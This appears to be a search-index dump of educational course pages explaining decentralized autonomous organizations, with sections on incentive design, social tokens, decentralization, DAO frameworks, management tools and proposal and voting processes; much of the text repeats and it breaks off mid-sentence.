metagame.wtf . Simply, DAOs are internet-native organizations. What do they offer? Pragmatically DAOs have the ability to: establish the token - initial founders + economics/design fundraise and allocate corporate actions - voting network establishing - maybe the DAO/token is a starting point for another side chain. initial conditions for network/network design - maybe there are certain aspects of the network that could be voted on. creating partnerships creating buckets for grants paying employees - yay, Opolis , Coordinape and Smart Invoice ! DAOs address the Principal-Agent Problem , whereas networks grow members who delegate their power to a representative, concentrating power. This is done to deal with the complexity costs of dealing with large groups of people . This is most pronounced in large centralized institutions. However, due to an asymmetry of power, information and incentives, these agents can serve themselves at the expense of others. Examples of this can be Chief Financial Officer misappropriating funds. Or a charity\u2019s executive board devoting the majority of donations to salaries instead of its stated mission. The root of these issues is due to the general lack of immediate accountability due to poor transparency of rules, incentives, and financial information, the arbitrary execution of policies and poor ability to voice concerns. Through smart contracts, DAOs provide transparency, self-reinforcing rules, clear incentives and disintermediate control. This allows everyone to have a vote that is enforced. It also provides an open and programmatic means of viewing the community\u2019s finances and voting history. Smart contracts can also be used to design incentives that limit the principal-agent problem, increase security, direct member actions towards a goal, and increase collaboration between members. In some ways, DAOs can be seen as an evolution of tokens where they help further coordinate actions between people. The token represents a shared ownership; the DAO helps to coordinate this. One could take this further and anchor a DAO to the real world with a LAO , creating a link between the internet native organization and a local jurisdiction (like Wyoming, which has laws around DAOs){target=_blank}. DAOs have been called the future of work. For example, one could spin a DAO up, inject a company via LAO, a payment mechanism and then help coordinate an industry with freelancers around the world for-profit. Incentive Design Token engineering can be applied to create the guardrails which can concentrate member actions towards a goal. Token engineering is defined as a discipline focused on designing the self-organizing systems enabled through cryptographic peer-to-peer networks . Since individual motivations can vary, one starts with the assumption that economic incentives and disincentives can motivate members towards a particular action. These levers can be used to scope participant actions, creating predictability absent social cues on the internet or understanding each entity\u2019s intent. An economic assumption creates an upper bound on an attack or counter-incentivized actions. This is because if costly enough, the attacker will at some point run out of funds. Thus, we limit the scope and number of potential hostile actors and actions by raising the cost of negative actions. This idea also underpins how Cryptoeconomics works. Cryptoeconomics is the use of economic incentives to provide guarantees about applications in open and adversarial networks. In the context of DAOs, the application is social collaboration towards a goal. This economic assumption can also be extended to social capital . Through the application of tokenomics, communities can scale collaboration through the careful management of their treasury. CryptoEconomics is the hamburger bun, tokenomics is the meat of a community . CryptoEconomics can provide security, while tokenomics provides the additional layer of incentives to grow and manage the community. You can use tools and services by BlockScience like CadCad to begin to reason how to design and stress test a token. Community Tokens, Social Tokens and Creator Economies Some level of social capital can be captured into a social token or community token. A good breakdown of both can be found here . Learn about social tokens and how DAOs help enable them. Listen to a16z\u2019s perspective on social tokens with Kevin Chou from Rally . Rally is like WordPress for social tokens. Another platform can be Fyooz . An excellent community token example can be FWB . An example of a social token can be Portugal The Man\u2019s Social Token . An interesting example of a social token is r/cryptocurrency \u2019s MOON token. These tokens can be the building block to a creator economy of producers. However, just having a social token doesn\u2019t create a DAO. Gradients of Decentralization Decentralization can be considered a spectrum and, to many aspiring projects, a goal. However, just because a project is on a blockchain or has smart contracts does not mean it is decentralized. For example, projects like Circle's USDC or Tether's USDT are major projects controlled by centralized entities. Although they use smart contracts, they are developed by a traditional company and leverage traditional banking infrastructure to hold the underlying collateral. Similarly, just because a project has a governance token does not make it decentralized. This could be due to the concentration of governance tokens in a few wallets. Another reason could be how the smart contract is designed, centralizing through the amount of \"admin-only\" permissions in the code. A project could be centralized through the governance structure itself. One manner is by requiring a high minimum of tokens to make a proposal. If this proposal is higher than what 99% of token holders have, this effectively centralizes control, similar to complaints about Uniswap . A project could also restrict control at the final decision level, similar to Sythentix's Spartan Council , where proposals are voted on by a rotating committee of people elected by token holders. There are legal mechanisms that can restrict participation as well. The restriction could be through the open-source project's license, which limits the scope of what can be forked . If a project has a formal corporate entity to develop the underlying protocol and project, then the shareholders and possible investors could sway the project. Examples can be Uniswap or Compound, which have companies that act as stewards of the protocol. This is not to be confused with any intention control projects in a disingenuous manner. Due to the newness of DAOs, the legal codification of this new structure of organization is not widespread, with the state of Wyoming being one of the few that has laws around them . Having a legal entity helps with off-chain things like taxes, bank accounts, paying bills, etc. Additionally, industry patterns are emerging around using multi-signature wallets to allow teams to have checks and balances over code updates and treasury spending. There are even some new ideas around using a network to help manage wallets . That way, one person can't run off with the funds like what occurred early on with SushiSwap . Or have the concentration risk of one person having a massive amount of power. A simple way to restrict control could also be by just keeping certain key repositories closed sourced, thereby limiting information. However, information could also be limited intentionally or unintentionally through having too many informal or off-chain governance mechanisms which excluded the token holders. Off-chain governance occurs if consensus or voting without voting on-chain. With all this being said, complete decentralization is a target goal for many projects. Most projects start somewhat centralized, as the people that make up the teams are experimenting with a new form of organization. Usually, projects will express their intent to decentralize and issue a roadmap with goalposts to meet. As patterns and tools are refined and people share experiences, we can expect to see more projects initially start with a higher level of decentralization. As of 2021, a few projects have achieved some high level of decentralization, like MakerDAO and Synthetix, among others. Examples of DAOs DAOs are emerging in many places. See an overview of DAOs in the 2021 Q2 ConsenSys DeFi report . In the DeFi space, MakerDAO focuses on creating a stablecoin for the world. Yearn Finance works to help automate yield farming with crowdsourced strategies for its members, similar to a decentralized hedge fund. Uniswap and SushiSwap are both Decentralized Exchange Protocols aiming to help users trade digital assets. Nexus Mutual is a decentralized insurance protocol that offers policies to guard against exchange and smart contract hacks. BadgerDAO creates products and infrastructure to bring Bitcoin to DeFi. IndexCoop creates indexes of crypto assets and aims to become a decentralized BlackRock. Finally, TheLAO is an example of the first decentralized for-profit DAO backed by a legal framework pioneered by OpenLaw . LexDAO is made up of legal engineers creating bridges between legal code and smart contracts. DAOs also found the world of art and media. BanklessDAO aims to practice what they preach and organize to create a decentralized newsroom and set of financial products. FlamingoDAO invests in NFT, games and the Metaverse. Bored Apes Yacht Club and Pudgy Penguins focus on selling limited edition art around NFTs , to pretty good success. Finally, Audius is creating a decentralized music service. DAOs can emerge around social causes like Meta Gamma Delta , an inclusive and empowering society supporting women-led projects . Or Gitcoin, which is focused on advancing public goods funding . They can be used to organize developers around creating developer tools like RaidGuild and Radicle . Learn more about the latest DAO developments at DAOTalk.org , p2pModels.EU or subscribe to Boardroom's substack . Read more about DAOs via DAOHaus or Aragon's list of DAO in 15 different industries . Additional Resources Article: Organizational Legos, The State of DAO Tooling (Nichanan Kesonpat) Excellent overview of available tooling for DAOs from Fall 2021","title":"DAO - Decentralized Autonomous Organizations"},{"location":"S06-daos/M1-understand/#dao-decentralized-autonomous-organizations","text":"\u201cIf you want to go fast, go alone. If you want to go far, go together.\u201d \u2013 African proverb.","title":"DAO - Decentralized Autonomous Organizations"},{"location":"S06-daos/M1-understand/#understand-a-dao","text":"","title":"Understand a DAO"},{"location":"S06-daos/M1-understand/#what-are-they","text":"DAOs or Decentralized Autonomous Organizations are member-owned communities with a built-in treasury, no central leadership, and whose rules of engagement are codified into smart contracts. They can be a safe way to collaborate with internet strangers while committing funds towards a specific cause. DAOs are a mechanism for social scalability since they allow members to organize and direct capital towards goals in a trustless and fluid manner. The use of smart contracts allows for the transparency of funds, the rules of operation, and the creation of incentive mechanisms to provide security guarantees around member actions. Thus the economics and control of an organization are laid out transparently, allowing for \u201ctrustless\u201d peer to peer participation in open and insecure networks. Aragon further explains DAOs, a DAO framework we will soon explore. An excellent visual description of DAOs can be found here . Finally, you can find a list of interesting DAO resources via DAOtalk.org and metagame.wtf . Simply, DAOs are internet-native organizations.","title":"What are they?"},{"location":"S06-daos/M1-understand/#what-do-they-offer","text":"Pragmatically DAOs have the ability to: establish the token - initial founders + economics/design fundraise and allocate corporate actions - voting network establishing - maybe the DAO/token is a starting point for another side chain. initial conditions for network/network design - maybe there are certain aspects of the network that could be voted on. creating partnerships creating buckets for grants paying employees - yay, Opolis , Coordinape and Smart Invoice ! DAOs address the Principal-Agent Problem , whereas networks grow members who delegate their power to a representative, concentrating power. This is done to deal with the complexity costs of dealing with large groups of people . This is most pronounced in large centralized institutions. However, due to an asymmetry of power, information and incentives, these agents can serve themselves at the expense of others. Examples of this can be Chief Financial Officer misappropriating funds. Or a charity\u2019s executive board devoting the majority of donations to salaries instead of its stated mission. The root of these issues is due to the general lack of immediate accountability due to poor transparency of rules, incentives, and financial information, the arbitrary execution of policies and poor ability to voice concerns. Through smart contracts, DAOs provide transparency, self-reinforcing rules, clear incentives and disintermediate control. This allows everyone to have a vote that is enforced. It also provides an open and programmatic means of viewing the community\u2019s finances and voting history. Smart contracts can also be used to design incentives that limit the principal-agent problem, increase security, direct member actions towards a goal, and increase collaboration between members. In some ways, DAOs can be seen as an evolution of tokens where they help further coordinate actions between people. The token represents a shared ownership; the DAO helps to coordinate this. One could take this further and anchor a DAO to the real world with a LAO , creating a link between the internet native organization and a local jurisdiction (like Wyoming, which has laws around DAOs){target=_blank}. DAOs have been called the future of work. For example, one could spin a DAO up, inject a company via LAO, a payment mechanism and then help coordinate an industry with freelancers around the world for-profit.","title":"What do they offer?"},{"location":"S06-daos/M1-understand/#incentive-design","text":"Token engineering can be applied to create the guardrails which can concentrate member actions towards a goal. Token engineering is defined as a discipline focused on designing the self-organizing systems enabled through cryptographic peer-to-peer networks . Since individual motivations can vary, one starts with the assumption that economic incentives and disincentives can motivate members towards a particular action. These levers can be used to scope participant actions, creating predictability absent social cues on the internet or understanding each entity\u2019s intent. An economic assumption creates an upper bound on an attack or counter-incentivized actions. This is because if costly enough, the attacker will at some point run out of funds. Thus, we limit the scope and number of potential hostile actors and actions by raising the cost of negative actions. This idea also underpins how Cryptoeconomics works. Cryptoeconomics is the use of economic incentives to provide guarantees about applications in open and adversarial networks. In the context of DAOs, the application is social collaboration towards a goal. This economic assumption can also be extended to social capital . Through the application of tokenomics, communities can scale collaboration through the careful management of their treasury. CryptoEconomics is the hamburger bun, tokenomics is the meat of a community . CryptoEconomics can provide security, while tokenomics provides the additional layer of incentives to grow and manage the community. You can use tools and services by BlockScience like CadCad to begin to reason how to design and stress test a token.","title":"Incentive Design"},{"location":"S06-daos/M1-understand/#community-tokens-social-tokens-and-creator-economies","text":"Some level of social capital can be captured into a social token or community token. A good breakdown of both can be found here . Learn about social tokens and how DAOs help enable them. Listen to a16z\u2019s perspective on social tokens with Kevin Chou from Rally . Rally is like WordPress for social tokens. Another platform can be Fyooz . An excellent community token example can be FWB . An example of a social token can be Portugal The Man\u2019s Social Token . An interesting example of a social token is r/cryptocurrency \u2019s MOON token. These tokens can be the building block to a creator economy of producers. However, just having a social token doesn\u2019t create a DAO.","title":"Community Tokens, Social Tokens and Creator Economies"},{"location":"S06-daos/M1-understand/#gradients-of-decentralization","text":"Decentralization can be considered a spectrum and, to many aspiring projects, a goal. However, just because a project is on a blockchain or has smart contracts does not mean it is decentralized. For example, projects like Circle's USDC or Tether's USDT are major projects controlled by centralized entities. Although they use smart contracts, they are developed by a traditional company and leverage traditional banking infrastructure to hold the underlying collateral. Similarly, just because a project has a governance token does not make it decentralized. This could be due to the concentration of governance tokens in a few wallets. Another reason could be how the smart contract is designed, centralizing through the amount of \"admin-only\" permissions in the code. A project could be centralized through the governance structure itself. One manner is by requiring a high minimum of tokens to make a proposal. If this proposal is higher than what 99% of token holders have, this effectively centralizes control, similar to complaints about Uniswap . A project could also restrict control at the final decision level, similar to Sythentix's Spartan Council , where proposals are voted on by a rotating committee of people elected by token holders. There are legal mechanisms that can restrict participation as well. The restriction could be through the open-source project's license, which limits the scope of what can be forked . If a project has a formal corporate entity to develop the underlying protocol and project, then the shareholders and possible investors could sway the project. Examples can be Uniswap or Compound, which have companies that act as stewards of the protocol. This is not to be confused with any intention control projects in a disingenuous manner. Due to the newness of DAOs, the legal codification of this new structure of organization is not widespread, with the state of Wyoming being one of the few that has laws around them . Having a legal entity helps with off-chain things like taxes, bank accounts, paying bills, etc. Additionally, industry patterns are emerging around using multi-signature wallets to allow teams to have checks and balances over code updates and treasury spending. There are even some new ideas around using a network to help manage wallets . That way, one person can't run off with the funds like what occurred early on with SushiSwap . Or have the concentration risk of one person having a massive amount of power. A simple way to restrict control could also be by just keeping certain key repositories closed sourced, thereby limiting information. However, information could also be limited intentionally or unintentionally through having too many informal or off-chain governance mechanisms which excluded the token holders. Off-chain governance occurs if consensus or voting without voting on-chain. With all this being said, complete decentralization is a target goal for many projects. Most projects start somewhat centralized, as the people that make up the teams are experimenting with a new form of organization. Usually, projects will express their intent to decentralize and issue a roadmap with goalposts to meet. As patterns and tools are refined and people share experiences, we can expect to see more projects initially start with a higher level of decentralization. As of 2021, a few projects have achieved some high level of decentralization, like MakerDAO and Synthetix, among others.","title":"Gradients of Decentralization"},{"location":"S06-daos/M1-understand/#examples-of-daos","text":"DAOs are emerging in many places. See an overview of DAOs in the 2021 Q2 ConsenSys DeFi report . In the DeFi space, MakerDAO focuses on creating a stablecoin for the world. Yearn Finance works to help automate yield farming with crowdsourced strategies for its members, similar to a decentralized hedge fund. Uniswap and SushiSwap are both Decentralized Exchange Protocols aiming to help users trade digital assets. Nexus Mutual is a decentralized insurance protocol that offers policies to guard against exchange and smart contract hacks. BadgerDAO creates products and infrastructure to bring Bitcoin to DeFi. IndexCoop creates indexes of crypto assets and aims to become a decentralized BlackRock. Finally, TheLAO is an example of the first decentralized for-profit DAO backed by a legal framework pioneered by OpenLaw . LexDAO is made up of legal engineers creating bridges between legal code and smart contracts. DAOs also found the world of art and media. BanklessDAO aims to practice what they preach and organize to create a decentralized newsroom and set of financial products. FlamingoDAO invests in NFT, games and the Metaverse. Bored Apes Yacht Club and Pudgy Penguins focus on selling limited edition art around NFTs , to pretty good success. Finally, Audius is creating a decentralized music service. DAOs can emerge around social causes like Meta Gamma Delta , an inclusive and empowering society supporting women-led projects . Or Gitcoin, which is focused on advancing public goods funding . They can be used to organize developers around creating developer tools like RaidGuild and Radicle . Learn more about the latest DAO developments at DAOTalk.org , p2pModels.EU or subscribe to Boardroom's substack . Read more about DAOs via DAOHaus or Aragon's list of DAO in 15 different industries .","title":"Examples of DAOs"},{"location":"S06-daos/M1-understand/#additional-resources","text":"Article: Organizational Legos, The State of DAO Tooling (Nichanan Kesonpat) Excellent overview of available tooling for DAOs from Fall 2021","title":"Additional Resources"},{"location":"S06-daos/M2-build/","text":"DAO - Decentralized Autonomous Organizations \u201cIf you want to go fast, go alone. If you want to go far, go together.\u201d \u2013 African proverb. Create a DAO Like building a website, you can create a DAO with easy-to-spin-up tools or customizable frameworks. If you want to start quickly, you can use DAOHaus. DAOHaus has a great general guideline on the basics you need to start a DAO . Here is another guide on an overview of how DAOs work . The bare minimum that is needed is: A mission statement A place to hang and meet A regular community call or meeting The DAO Smart Contracts DAO Tools and Services Beyond the basics, developers can build full-featured and more customized DAOs. Here are some of the leading DAO frameworks. DAO and Governance Frameworks Moloch (via DAOHaus) Moloch is a governance framework that allows a creator to spin up a DAO via DAOHaus easily. Their contracts are very minimal to avoid bugs and were used to spin up various DAOs early on. The project is named after the Canaanite god of child sacrifice to refer to the suboptimal outcomes due to poor group coordination. Groups can suffer from poor judgement, misaligned incentives and wrong goals. Moloch was created to help solve the incentive and coordination problems in funding public goods open-source protocols. Circa 2021, they also have lots of funding available for promising DAOs. You can learn more about them here and get an excellent overview here . Their GitHub and their hackMD also have interesting resources to learn more. Aragon Aragon offers a full suite of tools to create and manage your DAO. They have an easy way to spin up your DAO via their site . Aragon client lets you spin up the DAO. Aragon Govern is a tool for on-chain voting. Aragon Court is for dispute resolution that is Sybil resistant, similar to Kleros Court . Aragon Voice helps DAOs with submitting proposals similar to Discourse . Finally, Vocdoni focuses on digital voting solutions for organizations. OpenZeppelin OpenZeppelin developed OpenZeppelin Governor, a suite of smart contracts for governance. This post has a very comprehensive look into OpenZeppelin Governor. OpenZeppelin Governor ties into Tally and OpenZeppelin Defender for a comprehensive method of governance. You can play with OpenZeppelin Governor via Openzeppelin's fantastic code interface . Their docs have a great explanation of how to set up on-chain governance. Tally's Docs describes OpenZeppelin Governor as well. Using OpenZeppelin allows for a more customizable and extensible system. Others Colony and DAOStack are two other DAO frameworks. However, their communities are smaller than Aragon and Moloch. Therefore, evaluate the frameworks and choose the best. A deeper comparison of Colony, DAOStack and Aragon can be found here . DAO Management Tools Coordination goes beyond having a suite of smart contracts. DAO typically have various other tools to help create, sustain and grow their communities. Authority The industry is fast coalescing to using Multi-Signature wallets to decentralize the control of contracts and increase security. Gnosis Wallet is the leader in this space, being used by Synthetix, SushiSwap, Balance, Ethereum Name Service and more. Multi-sigs are essentially smart contracts that hold assets, thereby having extensible logic which can help with security. Synthetix is a good case study to outline their use of multisig within their governance system . Chat Platforms Most DAOs chat via Discord, a popular gaming platform due to its free and powerful paid features. DiscordJS allows for the creation of bots that can be integrated into the server. However, Discord is a centralized service. Using them creates centralization risk, and they would be able to shut down your server as they did to Wall St. Bets . Open source decentralized solutions exist like Matrix Protocol , a decentralized conversation store with no central point of failure. There are various user-friendly clients for both mobile and desktop that support Matrix Protocol like Element . Mastodon is another open-source and user-friendly project. Think of it as a decentralized Twitter meets Reddit. User onboarding is essential to a community. This can happen on a Chat Platform. A great example is how BanklessDAO does it. Check them out and see how they approach their website and discord onboarding . For lead generation, you can create a subreddit to populate it with content and attract new members. However, be aware that Reddit is centralized. The upside is that it's highly customizable with the ability to add wikis, widgets. Their auto moderator system is pretty advanced to keep a good percentage of spam, trolls and scammers out. You can integrate it with Ethereum based tokens and create an attractive token economy there. You can see r/cryptocurrency and learn about MOONs . Video platforms Video chat allows for members to create a closer community. Zoom, Google Meet, Discord's video conferencing feature, and Jitsi are popular options. Zoom and Google limit the time a call can occur. Discord Limits the size. Jitsi is free, open-source and works via a web browser. Its paid version called 8x8 is $USD 12 a year and allows for saving video recordings. If you are more technical, you can deploy your own Jitsi instance to host conversations. Proposal Staging There are various tools to stage and propose improvements to the community. The most popular platform used is Discourse . However, Discourse was not made for DAOs, and fast-rising platforms cater to crypto projects like Tally and Boardroom . Tally helps users participate with on-chain governance, while Boardroom helps with the entire flow of collaboration . Ironically Discourse could be a more decentralized approach since their codebase is free and open-source, allowing customization and self-hosting. Another tool that can be used is Notion which allows for easy customization. Hackathon idea: Create an open-source Discourse plug-in that reads from the chain. Voting and Vesting Voting can happen on-chain or off-chain. Before Layer-2 solutions, on-chain voting was expensive. So tools like SnapShot were created to allow off-chain voting by allowing users to sign for or against a proposal. Boardroom and Tally also aim to help with this. Although people can vote, it doesn't mean that they will. Or that they would hold on to the governance token. DeFi projects like Curve and SushiSwap are looking to use a vote locking mechanism to boost yields to those who stake their tokens long term vs others who don't. Rewarding DAOs can also reward contributors with payroll-like solutions. Developed by Yearn Finance, Coordinape allows DAOs to reward, incentivize and scale DAO operations. Smart Invoice by Raid Guild is another solution and is described here . You can also engage in liquidity mining operations as a marketing and onboarding strategy for user engagement. Domains You can host your site on a decentralized file storage solution like IPFS or Filecoin. An easy and free way to use IPFS is via NeoCities . You can use Unstoppable Domains to buy domains for: .crypto, .bitcoin, .dao, .nft, .blockchain, .wallet and more. Furthermore, you can use Ethereum Name Service to buy a .eth domain name and eth.link , which links DNS to Ethereum via EthDNS and also link your website, which also works with IPFS. Data Another identity solution is 3Box which offers various tools for decentralized storage, messaging and identity. They also offer Ceramic Network for serverless applications. You can also host your DAO's data via Textile's decentralized infrastructure, which runs on IPFS. Identity With Serto can issue a verifiable credential , aka \"Crypto Cookies, \" a building block for decentralized identity. They are tamper-resistant cryptographic signatures issued by one entity to a receiver to establish a relationship. And the work off-chain! Why use these over NFTs? An NFT is on-chain and is like a commendation, while verifiable credentials are like recommendations and work on or off-chain. They establish a relationship between entities, say like a club and its members or a college and a graduate. These relationships are important because people's recommendations and references help make up our external identities and reputations. By having a self-sovereign identity, one could interact reliably and issue credit or other benefits without intermediaries. In DeFi, identity would help to create credit scores. They could be within DAOs for reputation or to promote greater trust between members since affiliations cannot be forged. This would help build an interoperable deep web of trust based on user interactions rather than issued centrally. We will now see how these tools are used in conjunction to create a governance system.","title":"DAO - Decentralized Autonomous Organizations"},{"location":"S06-daos/M2-build/#dao-decentralized-autonomous-organizations","text":"\u201cIf you want to go fast, go alone. If you want to go far, go together.\u201d \u2013 African proverb.","title":"DAO - Decentralized Autonomous Organizations"},{"location":"S06-daos/M2-build/#create-a-dao","text":"Like building a website, you can create a DAO with easy-to-spin-up tools or customizable frameworks. If you want to start quickly, you can use DAOHaus. DAOHaus has a great general guideline on the basics you need to start a DAO . Here is another guide on an overview of how DAOs work . The bare minimum that is needed is: A mission statement A place to hang and meet A regular community call or meeting The DAO Smart Contracts","title":"Create a DAO"},{"location":"S06-daos/M2-build/#dao-tools-and-services","text":"Beyond the basics, developers can build full-featured and more customized DAOs. Here are some of the leading DAO frameworks.","title":"DAO Tools and Services"},{"location":"S06-daos/M2-build/#dao-and-governance-frameworks","text":"Moloch (via DAOHaus) Moloch is a governance framework that allows a creator to spin up a DAO via DAOHaus easily. Their contracts are very minimal to avoid bugs and were used to spin up various DAOs early on. The project is named after the Canaanite god of child sacrifice to refer to the suboptimal outcomes due to poor group coordination. Groups can suffer from poor judgement, misaligned incentives and wrong goals. Moloch was created to help solve the incentive and coordination problems in funding public goods open-source protocols. Circa 2021, they also have lots of funding available for promising DAOs. You can learn more about them here and get an excellent overview here . Their GitHub and their hackMD also have interesting resources to learn more.","title":"DAO and Governance Frameworks"},{"location":"S06-daos/M2-build/#aragon","text":"Aragon offers a full suite of tools to create and manage your DAO. They have an easy way to spin up your DAO via their site . Aragon client lets you spin up the DAO. Aragon Govern is a tool for on-chain voting. Aragon Court is for dispute resolution that is Sybil resistant, similar to Kleros Court . Aragon Voice helps DAOs with submitting proposals similar to Discourse . Finally, Vocdoni focuses on digital voting solutions for organizations.","title":"Aragon"},{"location":"S06-daos/M2-build/#openzeppelin","text":"OpenZeppelin developed OpenZeppelin Governor, a suite of smart contracts for governance. This post has a very comprehensive look into OpenZeppelin Governor. OpenZeppelin Governor ties into Tally and OpenZeppelin Defender for a comprehensive method of governance. You can play with OpenZeppelin Governor via Openzeppelin's fantastic code interface . Their docs have a great explanation of how to set up on-chain governance. Tally's Docs describes OpenZeppelin Governor as well. Using OpenZeppelin allows for a more customizable and extensible system.","title":"OpenZeppelin"},{"location":"S06-daos/M2-build/#others","text":"Colony and DAOStack are two other DAO frameworks. However, their communities are smaller than Aragon and Moloch. Therefore, evaluate the frameworks and choose the best. A deeper comparison of Colony, DAOStack and Aragon can be found here .","title":"Others"},{"location":"S06-daos/M2-build/#dao-management-tools","text":"Coordination goes beyond having a suite of smart contracts. DAO typically have various other tools to help create, sustain and grow their communities.","title":"DAO Management Tools"},{"location":"S06-daos/M2-build/#authority","text":"The industry is fast coalescing to using Multi-Signature wallets to decentralize the control of contracts and increase security. Gnosis Wallet is the leader in this space, being used by Synthetix, SushiSwap, Balance, Ethereum Name Service and more. Multi-sigs are essentially smart contracts that hold assets, thereby having extensible logic which can help with security. Synthetix is a good case study to outline their use of multisig within their governance system .","title":"Authority"},{"location":"S06-daos/M2-build/#chat-platforms","text":"Most DAOs chat via Discord, a popular gaming platform due to its free and powerful paid features. DiscordJS allows for the creation of bots that can be integrated into the server. However, Discord is a centralized service. Using them creates centralization risk, and they would be able to shut down your server as they did to Wall St. Bets . Open source decentralized solutions exist like Matrix Protocol , a decentralized conversation store with no central point of failure. There are various user-friendly clients for both mobile and desktop that support Matrix Protocol like Element . Mastodon is another open-source and user-friendly project. Think of it as a decentralized Twitter meets Reddit. User onboarding is essential to a community. This can happen on a Chat Platform. A great example is how BanklessDAO does it. Check them out and see how they approach their website and discord onboarding . For lead generation, you can create a subreddit to populate it with content and attract new members. However, be aware that Reddit is centralized. The upside is that it's highly customizable with the ability to add wikis, widgets. Their auto moderator system is pretty advanced to keep a good percentage of spam, trolls and scammers out. You can integrate it with Ethereum based tokens and create an attractive token economy there. You can see r/cryptocurrency and learn about MOONs .","title":"Chat Platforms"},{"location":"S06-daos/M2-build/#video-platforms","text":"Video chat allows for members to create a closer community. Zoom, Google Meet, Discord's video conferencing feature, and Jitsi are popular options. Zoom and Google limit the time a call can occur. Discord Limits the size. Jitsi is free, open-source and works via a web browser. Its paid version called 8x8 is $USD 12 a year and allows for saving video recordings. If you are more technical, you can deploy your own Jitsi instance to host conversations.","title":"Video platforms"},{"location":"S06-daos/M2-build/#proposal-staging","text":"There are various tools to stage and propose improvements to the community. The most popular platform used is Discourse . However, Discourse was not made for DAOs, and fast-rising platforms cater to crypto projects like Tally and Boardroom . Tally helps users participate with on-chain governance, while Boardroom helps with the entire flow of collaboration . Ironically Discourse could be a more decentralized approach since their codebase is free and open-source, allowing customization and self-hosting. Another tool that can be used is Notion which allows for easy customization. Hackathon idea: Create an open-source Discourse plug-in that reads from the chain.","title":"Proposal Staging"},{"location":"S06-daos/M2-build/#voting-and-vesting","text":"Voting can happen on-chain or off-chain. Before Layer-2 solutions, on-chain voting was expensive. So tools like SnapShot were created to allow off-chain voting by allowing users to sign for or against a proposal. Boardroom and Tally also aim to help with this. Although people can vote, it doesn't mean that they will. Or that they would hold on to the governance token. DeFi projects like Curve and SushiSwap are looking to use a vote locking mechanism to boost yields to those who stake their tokens long term vs others who don't.","title":"Voting and Vesting"},{"location":"S06-daos/M2-build/#rewarding","text":"DAOs can also reward contributors with payroll-like solutions. Developed by Yearn Finance, Coordinape allows DAOs to reward, incentivize and scale DAO operations. Smart Invoice by Raid Guild is another solution and is described here . You can also engage in liquidity mining operations as a marketing and onboarding strategy for user engagement.","title":"Rewarding"},{"location":"S06-daos/M2-build/#domains","text":"You can host your site on a decentralized file storage solution like IPFS or Filecoin. An easy and free way to use IPFS is via NeoCities . You can use Unstoppable Domains to buy domains for: .crypto, .bitcoin, .dao, .nft, .blockchain, .wallet and more. Furthermore, you can use Ethereum Name Service to buy a .eth domain name and eth.link , which links DNS to Ethereum via EthDNS and also link your website, which also works with IPFS.","title":"Domains"},{"location":"S06-daos/M2-build/#data","text":"Another identity solution is 3Box which offers various tools for decentralized storage, messaging and identity. They also offer Ceramic Network for serverless applications. You can also host your DAO's data via Textile's decentralized infrastructure, which runs on IPFS.","title":"Data"},{"location":"S06-daos/M2-build/#identity","text":"With Serto can issue a verifiable credential , aka \"Crypto Cookies, \" a building block for decentralized identity. They are tamper-resistant cryptographic signatures issued by one entity to a receiver to establish a relationship. And the work off-chain! Why use these over NFTs? An NFT is on-chain and is like a commendation, while verifiable credentials are like recommendations and work on or off-chain. They establish a relationship between entities, say like a club and its members or a college and a graduate. These relationships are important because people's recommendations and references help make up our external identities and reputations. By having a self-sovereign identity, one could interact reliably and issue credit or other benefits without intermediaries. In DeFi, identity would help to create credit scores. They could be within DAOs for reputation or to promote greater trust between members since affiliations cannot be forged. This would help build an interoperable deep web of trust based on user interactions rather than issued centrally. We will now see how these tools are used in conjunction to create a governance system.","title":"Identity"},{"location":"S06-daos/M3-manage/","text":"DAO - Decentralized Autonomous Organizations \u201cIf you want to go fast, go alone. If you want to go far, go together.\u201d \u2013 African proverb. Manage and Scale a DAO Soft Skills Decentralization doesn\u2019t just have smart contracts. DAO are about people, and thus soft skills are essential. Jono Bacon has written the best book on community management called \u201cThe Art of Community\u201d . It is HIGHLY recommended to read. A great way to get the soft skills to manage a DAO is to join a meetup and perhaps co-organize an event. You can find Ethereum meetups with like-minded individuals around the world via the ConsenSys BUDIL Network . In addition, you can become a valued member of a community by joining the ConsenSys Discord. Another way is by joining a project like AirSwap ! AirSwap is dedicated to creating tools for frictionless trade. They have an excellent governance system and need devs like you! Join their Discord and check out their roadmap. If NFTs are your thing, check out Megaliths . Or check out the DAOs on DAOHaus. DAOs also need clear lines of communication, transparency of information, and an inclusive governance structure. This means a transparent voting process and consensus making mechanism. Code of Conduct Along with a mission statement, a Code of Conduct is a must. A great one that can be built off is the Berlin Code of Conduct which is open source, modifiable and extensible. A code of conduct is a MUST. As groups start to scale, there will inevitably be issues with certain members. Remarkably, most people are chill, and you can set the tone very easily by having clear expectations written in a code of conduct. The clearer your rules are, the easier it is to collaborate. Governance Structure Decentralization means clear governance structures. Luckily we have some prior history with specific DeFi projects from which we can learn. For example, yearn Finance, Synthetix, Compound Finance and MakerDAO have great governance models worth studying. Improvement Process The improvement process is the method by which projects like Ethereum, protocols and DAO manage change. There are typically three types of proposals. Improvement proposals involve adding, removing, or improving some code, to the project or adjusting to governance. This could be adding a new feature for members or users. Configuration proposals involve adjusting variables in smart contracts, say the collateralization ratio. Finally, meta proposals involve proposals around the improvement process itself. The general process for creating a proposal is: Discussion Discussions start informally via chat platforms, online forums and meetings. Eventually, the ideas begin to coalesce into something tangible. The next move could be a temperature check, where a quick poll can gauge support said idea. During this process, the ideas are refined as they are still in a nascent stage. It is interesting to note that Discord and chat platforms, in general, are great for creating community building, brainstorming and getting immediate feedback. However, due to a chat platform's UX/UI, they are NOT a great place to host binding votes or establish long-form conversations. Discourse allows for long-form threads, which allow for more well thought out conversations. However, this comes at the cost of a lack of immediacy in response. Discourse can also be configured to be found on search engines, which help with attracting potential members. Some Discourse forums are more technically focused on catering to their audiences, like Ethresear.ch or research.synthetix.io . Others are more informal. Tailor it to suit your needs. Side note, you can customize your Discourse template to make it more UX/UI friendly and organized. That effort will go a long way. Write up of Improvement Proposal Once the idea has been discussed, a draft is created. There are various tags for proposals. The general gist of these are: Draft - still in draft stage Review - finalized and open for further community input. It can go back to the draft stage. Submitted - staged to go through the proposal process. The voting period is set. Pending Vote - in vote stage Accepted - went through with a number of votes needed Rejected - rejected. Back to the drawing boards or abandoned Completed - Team has implemented the proposal There can be other tags like On Roadmap . Again, you can customize these as your community sees fit. Voting Usually, voting occurs with a governance token. This corresponds to 1 token = 1 vote. Although this may seem unfair, it is the only method known to prevent Sybil attacks. Perhaps once the industry figures out how to use decentralized identities, we can see more typical voting forms. The leading DeFi Protocols use Snapshot as their tool of choice to avoid gas fees. However, as Layer 2 solutions 